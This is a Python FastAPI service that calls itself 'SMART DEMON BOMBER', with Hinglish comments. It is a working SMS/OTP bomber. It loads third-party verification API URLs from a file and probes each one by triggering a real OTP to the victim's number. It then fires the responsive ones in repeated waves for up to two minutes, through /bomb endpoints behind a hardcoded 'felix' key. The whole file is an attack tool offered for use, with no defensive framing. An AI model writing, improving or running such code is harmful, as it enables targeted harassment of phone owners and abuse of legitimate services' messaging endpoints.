# app.py - Smart Bomber (Auto Dead API Ignore)
from fastapi import FastAPI, HTTPException
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
import aiohttp
import asyncio
import time
import os
import re
import json

app = FastAPI(title="🔥 SMART DEMON BOMBER")

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)

# ------------------ FELIX KEY ------------------
VALID_KEYS = ["felix", "FELIX", "Felix", "f3l1x"]

def validate_key(key: str) -> bool:
    return key in VALID_KEYS

# ------------------ LOAD SIRF TERI FILE ------------------
def load_apis():
    apis = []
    try:
        with open("bomber_apis.txt", "r", encoding="utf-8") as f:
            for line in f:
                url = line.strip()
                if url and url.startswith("http"):
                    apis.append(url)
    except FileNotFoundError:
        print("❌ bomber_apis.txt nahi mili!")
        return []
    
    print(f"[+] Loaded {len(apis)} APIs from your file")
    return apis

ALL_APIS = load_apis()

# ------------------ SMART API CACHE ------------------
# Yeh store karega kaunsi API working hai aur kaunsi dead
API_STATUS = {}  # url -> True/False
CHECKED_APIS = set()

class BombRequest(BaseModel):
    number: str
    duration: int = 30
    key: str

# ------------------ SMART BOMBER ENGINE ------------------
async def check_api_alive(session, url, target):
    """Check if API is actually working (sends SMS/OTP)"""
    formatted = url
    formatted = formatted.replace("{num}", target)
    formatted = formatted.replace("{phone}", target)
    formatted = formatted.replace("{target}", target)
    formatted = formatted.replace("{no}", target)
    formatted = formatted.replace("{NUMBER}", target)
    formatted = formatted.replace("{aadhaar}", target)
    formatted = formatted.replace("{uid}", target)
    formatted = formatted.replace("{gst}", target)
    formatted = formatted.replace("{pan}", target)
    formatted = formatted.replace("{vehicle}", target)
    formatted = formatted.replace("{ifsc}", target)
    formatted = formatted.replace("{pin}", target)
    formatted = formatted.replace("{pincode}", target)
    formatted = formatted.replace("{imei}", target)
    formatted = formatted.replace("{phone_number}", target)
    formatted = formatted.replace("{mobile}", target)
    formatted = re.sub(r'\{[^}]+\}', target, formatted)
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "en-US,en;q=0.9",
        "Connection": "keep-alive"
    }
    
    try:
        async with session.get(formatted, headers=headers, timeout=3) as r:
            # REAL CHECK - actual OTP trigger hua ya nahi
            if r.status in [200, 201, 202, 204]:
                try:
                    text = await r.text()
                    text_lower = text.lower()
                    # OTP/success indicators
                    if any(word in text_lower for word in ["otp", "sent", "success", "verification", "code", "sms"]):
                        return True
                except:
                    pass
                # Agar response mein kuch useful hai toh maan lo working hai
                return True
            if r.status in [302, 303, 307, 308]:  # Redirect - usually means success
                return True
    except:
        pass
    return False

async def get_working_apis(target):
    """Find all working APIs from the file"""
    global API_STATUS, CHECKED_APIS
    
    working_apis = []
    
    async with aiohttp.ClientSession() as session:
        for url in ALL_APIS:
            # Agar pehle hi check kar chuke hain toh cached status use karo
            if url in API_STATUS:
                if API_STATUS[url]:
                    working_apis.append(url)
                continue
            
            # Naya API check karo
            is_alive = await check_api_alive(session, url, target)
            API_STATUS[url] = is_alive
            CHECKED_APIS.add(url)
            
            if is_alive:
                working_apis.append(url)
                print(f"[+] Working: {url[:60]}...")
            else:
                print(f"[-] Dead: {url[:60]}...")
    
    return working_apis

async def hit_api(session, url, target):
    """Fire API - only called for working APIs"""
    formatted = url
    formatted = formatted.replace("{num}", target)
    formatted = formatted.replace("{phone}", target)
    formatted = formatted.replace("{target}", target)
    formatted = formatted.replace("{no}", target)
    formatted = formatted.replace("{NUMBER}", target)
    formatted = formatted.replace("{aadhaar}", target)
    formatted = formatted.replace("{uid}", target)
    formatted = formatted.replace("{gst}", target)
    formatted = formatted.replace("{pan}", target)
    formatted = formatted.replace("{vehicle}", target)
    formatted = formatted.replace("{ifsc}", target)
    formatted = formatted.replace("{pin}", target)
    formatted = formatted.replace("{pincode}", target)
    formatted = formatted.replace("{imei}", target)
    formatted = formatted.replace("{phone_number}", target)
    formatted = formatted.replace("{mobile}", target)
    formatted = re.sub(r'\{[^}]+\}', target, formatted)
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "application/json, text/plain, */*"
    }
    
    try:
        async with session.get(formatted, headers=headers, timeout=2) as r:
            if r.status in [200, 201, 202, 204, 302, 303]:
                return True
    except:
        pass
    return False

async def run_smart_bomber(target, duration):
    """Smart Bomber - sirf working APIs use karega"""
    if not ALL_APIS:
        return {"error": "No APIs loaded! Check bomber_apis.txt"}
    
    print(f"[+] Finding working APIs for {target}...")
    working_apis = await get_working_apis(target)
    
    if not working_apis:
        return {
            "error": "No working APIs found!",
            "total_apis": len(ALL_APIS),
            "dead_apis": len(ALL_APIS) - len(working_apis),
            "working_apis": 0
        }
    
    print(f"[+] Found {len(working_apis)} working APIs out of {len(ALL_APIS)}")
    
    start = time.time()
    end = start + duration
    total = 0
    success = 0
    wave_count = 0
    
    async with aiohttp.ClientSession() as session:
        while time.time() < end:
            # SIRF WORKING APIs fire karo
            tasks = [hit_api(session, api, target) for api in working_apis]
            results = await asyncio.gather(*tasks)
            
            total += len(results)
            success += sum(1 for r in results if r)
            wave_count += 1
            
            await asyncio.sleep(0.1)
    
    return {
        "target": target,
        "duration": duration,
        "total_apis_in_file": len(ALL_APIS),
        "dead_apis": len(ALL_APIS) - len(working_apis),
        "working_apis": len(working_apis),
        "waves": wave_count,
        "total_requests": total,
        "successful_hits": success,
        "success_rate": round((success/total)*100, 2) if total > 0 else 0,
        "requests_per_second": round(total / duration, 2)
    }

# ------------------ API ENDPOINTS ------------------
@app.get("/")
async def root():
    return {
        "status": "🔥 SMART DEMON BOMBER",
        "version": "4.0",
        "total_apis_in_file": len(ALL_APIS),
        "apis_checked": len(CHECKED_APIS),
        "working_apis": sum(1 for v in API_STATUS.values() if v),
        "source": "bomber_apis.txt",
        "auth": "Required key: felix",
        "features": [
            "Auto detects working APIs",
            "Ignores dead APIs automatically",
            "Caches API status for speed",
            "Only fires confirmed working APIs"
        ]
    }

@app.get("/health")
async def health():
    return {
        "status": "online",
        "total_apis": len(ALL_APIS),
        "checked": len(CHECKED_APIS),
        "working": sum(1 for v in API_STATUS.values() if v)
    }

@app.get("/apis/status")
async def api_status():
    """Dekho kaunsi APIs working hain aur kaunsi dead"""
    working = []
    dead = []
    
    for url, is_working in API_STATUS.items():
        if is_working:
            working.append(url[:80] + "...")
        else:
            dead.append(url[:80] + "...")
    
    return {
        "total": len(ALL_APIS),
        "checked": len(CHECKED_APIS),
        "working_count": len(working),
        "dead_count": len(dead),
        "working_apis": working[:50],
        "dead_apis": dead[:50]
    }

@app.post("/bomb")
async def bomb(req: BombRequest):
    # 🔐 FELIX KEY CHECK
    if not validate_key(req.key):
        raise HTTPException(401, "❌ Invalid key! Need 'felix'")
    
    if len(req.number) < 8:
        raise HTTPException(400, "Invalid number")
    
    if req.duration < 5:
        req.duration = 5
    if req.duration > 120:
        req.duration = 120
    
    if not ALL_APIS:
        raise HTTPException(500, "No APIs loaded! Upload bomber_apis.txt")
    
    result = await run_smart_bomber(req.number, req.duration)
    
    return {
        "success": True,
        "attack_id": int(time.time()),
        "key_used": req.key,
        **result
    }

@app.post("/bomb/fast")
async def bomb_fast(req: BombRequest):
    """Fire and forget - immediate response"""
    
    # 🔐 FELIX KEY CHECK
    if not validate_key(req.key):
        raise HTTPException(401, "❌ Invalid key! Need 'felix'")
    
    if len(req.number) < 8:
        raise HTTPException(400, "Invalid number")
    
    if req.duration < 5:
        req.duration = 5
    if req.duration > 120:
        req.duration = 120
    
    if not ALL_APIS:
        raise HTTPException(500, "No APIs loaded!")
    
    # Fire in background
    asyncio.create_task(run_smart_bomber(req.number, req.duration))
    
    return {
        "success": True,
        "message": "🔥 SMART ATTACK STARTED!",
        "target": req.number,
        "duration": req.duration,
        "total_apis_in_file": len(ALL_APIS),
        "key_used": req.key
    }

# ------------------ RUN ------------------
if __name__ == "__main__":
    import uvicorn
    port = int(os.environ.get("PORT", 8000))
    uvicorn.run(app, host="0.0.0.0", port=port)
